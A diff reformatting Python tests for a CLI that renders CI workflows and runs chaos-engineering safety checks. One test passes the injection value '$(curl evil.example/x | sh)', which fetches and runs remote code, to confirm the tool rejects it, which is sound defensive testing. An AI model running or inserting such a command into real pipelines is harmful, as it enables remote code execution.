@@ -86,14 +86,10 @@ def _plan_and_graph(tmp_path: Path) -> tuple[Path, Path]:
             PlannedStep(
                 id="s0",
                 seq=0,
-                raw_action=InjectFault(
-                    fault="proc.pause", selectors=(selector,), duration=10.0
-                ),
+                raw_action=InjectFault(fault="proc.pause", selectors=(selector,), duration=10.0),
                 fault=PlannedFault(
                     fault_id="proc.pause",
-                    targets=(
-                        ResolvedTarget(selector=selector, node_ids=frozenset({"n-a"})),
-                    ),
+                    targets=(ResolvedTarget(selector=selector, node_ids=frozenset({"n-a"})),),
                     duration=10.0,
                     undo_ops=(UndoOp(op="kill"),),
                     verify_probes=(VerifyProbe(probe="proc.alive"),),
@@ -148,8 +144,15 @@ class TestWorkflowCommand:
     def test_a_pinned_github_workflow_is_written(self, tmp_path: Path) -> None:
         out = tmp_path / "wf.yml"
         result = _run(
-            "workflow", "--provider", "github", "--image", IMAGE, "--out", str(out),
-            "--env", "plan_ref=${{ github.head_ref }}",
+            "workflow",
+            "--provider",
+            "github",
+            "--image",
+            IMAGE,
+            "--out",
+            str(out),
+            "--env",
+            "plan_ref=${{ github.head_ref }}",
         )
         assert result.exit_code == ExitCode.SUCCESS, result.output
         rendered = out.read_text(encoding="utf-8")
@@ -174,40 +177,55 @@ class TestWorkflowCommand:
 
     def test_an_untrusted_value_carrying_shell_syntax_is_refused(self) -> None:
         result = _run(
-            "workflow", "--provider", "github", "--image", IMAGE,
-            "--env", "plan_ref=$(curl evil.example/x | sh)",
+            "workflow",
+            "--provider",
+            "github",
+            "--image",
+            IMAGE,
+            "--env",
+            "plan_ref=$(curl evil.example/x | sh)",
         )
         assert result.exit_code == ExitCode.VALIDATION_ERROR
         assert "ci_surface.untrusted_value_in_script" in result.output
 
     def test_a_malformed_env_pair_is_a_usage_error(self) -> None:
-        result = _run(
-            "workflow", "--provider", "github", "--image", IMAGE, "--env", "plan_ref"
-        )
+        result = _run("workflow", "--provider", "github", "--image", IMAGE, "--env", "plan_ref")
         assert result.exit_code == ExitCode.USAGE_ERROR
         assert "NAME=EXPRESSION" in result.output
 
     def test_a_gitlab_component_renders_the_github_expression_refusal(self) -> None:
         result = _run(
-            "workflow", "--provider", "gitlab", "--image", IMAGE,
-            "--env", "plan_ref=${{ github.head_ref }}",
+            "workflow",
+            "--provider",
+            "gitlab",
+            "--image",
+            IMAGE,
+            "--env",
+            "plan_ref=${{ github.head_ref }}",
         )
         assert result.exit_code == ExitCode.VALIDATION_ERROR
         assert "gitlab expression" in result.output
 
     def test_writing_over_a_directory_is_refused(self, tmp_path: Path) -> None:
-        result = _run(
-            "workflow", "--provider", "github", "--image", IMAGE, "--out", str(tmp_path)
-        )
+        result = _run("workflow", "--provider", "github", "--image", IMAGE, "--out", str(tmp_path))
         assert result.exit_code == ExitCode.VALIDATION_ERROR
         assert "is a directory" in result.output
 
     def test_the_generated_script_never_carries_an_expression(self, tmp_path: Path) -> None:
         out = tmp_path / "wf.yml"
         _run(
-            "workflow", "--provider", "github", "--image", IMAGE, "--out", str(out),
-            "--env", "plan_ref=${{ github.head_ref }}", "--release-gate",
-            "--check", "blast_radius",
+            "workflow",
+            "--provider",
+            "github",
+            "--image",
+            IMAGE,
+            "--out",
+            str(out),
+            "--env",
+            "plan_ref=${{ github.head_ref }}",
+            "--release-gate",
+            "--check",
+            "blast_radius",
         )
         rendered = out.read_text(encoding="utf-8")
         run_lines = [ln for ln in rendered.splitlines() if ln.strip().startswith("run:")]
@@ -222,9 +240,7 @@ class TestWorkflowCommand:
 class TestCheckCommand:
     def test_no_plan_means_unknown_everywhere_and_a_non_zero_exit(self, tmp_path: Path) -> None:
         summary = tmp_path / "summary.md"
-        result = _run(
-            "check", "--summary", str(summary), "--sha", SHA, "--ticket", "MAYHEM-4712"
-        )
+        result = _run("check", "--summary", str(summary), "--sha", SHA, "--ticket", "MAYHEM-4712")
         assert result.exit_code == ExitCode.SAFETY_REFUSAL
         rendered = summary.read_text(encoding="utf-8")
         assert "**UNKNOWN**" in rendered
@@ -235,8 +251,15 @@ class TestCheckCommand:
     def test_a_missing_topology_is_unknown_and_names_the_missing_file(self, tmp_path: Path) -> None:
         plan_path, _ = _plan_and_graph(tmp_path)
         result = _run(
-            "check", "--plan", str(plan_path), "--graph", str(tmp_path / "absent.json"),
-            "--sha", SHA, "--ticket", "MAYHEM-4712",
+            "check",
+            "--plan",
+            str(plan_path),
+            "--graph",
+            str(tmp_path / "absent.json"),
+            "--sha",
+            SHA,
+            "--ticket",
+            "MAYHEM-4712",
         )
         assert result.exit_code == ExitCode.VALIDATION_ERROR
         assert "absent.json" in result.output
@@ -253,8 +276,16 @@ class TestCheckCommand:
         summary = tmp_path / "summary.md"
         verdict_out = tmp_path / "verdict.json"
         result = _run(
-            "check", "--plan", str(plan_path), "--graph", str(graph_path),
-            "--summary", str(summary), "--verdict-out", str(verdict_out), *_change_flags(),
+            "check",
+            "--plan",
+            str(plan_path),
+            "--graph",
+            str(graph_path),
+            "--summary",
+            str(summary),
+            "--verdict-out",
+            str(verdict_out),
+            *_change_flags(),
         )
         assert result.exit_code == ExitCode.SAFETY_REFUSAL
         rendered = summary.read_text(encoding="utf-8")
@@ -273,9 +304,7 @@ class TestCheckCommand:
         assert result.exit_code == ExitCode.VALIDATION_ERROR
 
     def test_a_malformed_pin_is_a_usage_error(self) -> None:
-        result = _run(
-            "check", "--sha", SHA, "--ticket", "MAYHEM-4712", "--pin", "nonsense_axis=1"
-        )
+        result = _run("check", "--sha", SHA, "--ticket", "MAYHEM-4712", "--pin", "nonsense_axis=1")
         assert result.exit_code == ExitCode.USAGE_ERROR
         assert "nonsense_axis" in result.output
 
@@ -283,9 +312,19 @@ class TestCheckCommand:
         plan_path, graph_path = _plan_and_graph(tmp_path)
         summary = tmp_path / "summary.md"
         _run(
-            "check", "--plan", str(plan_path), "--graph", str(graph_path),
-            "--summary", str(summary), "--sha", SHA, "--ticket", "MAYHEM-4712",
-            "--pin", "plan_version=plan-7",
+            "check",
+            "--plan",
+            str(plan_path),
+            "--graph",
+            str(graph_path),
+            "--summary",
+            str(summary),
+            "--sha",
+            SHA,
+            "--ticket",
+            "MAYHEM-4712",
+            "--pin",
+            "plan_version=plan-7",
         )
         assert "**Unpinned axes:**" in summary.read_text(encoding="utf-8")
 
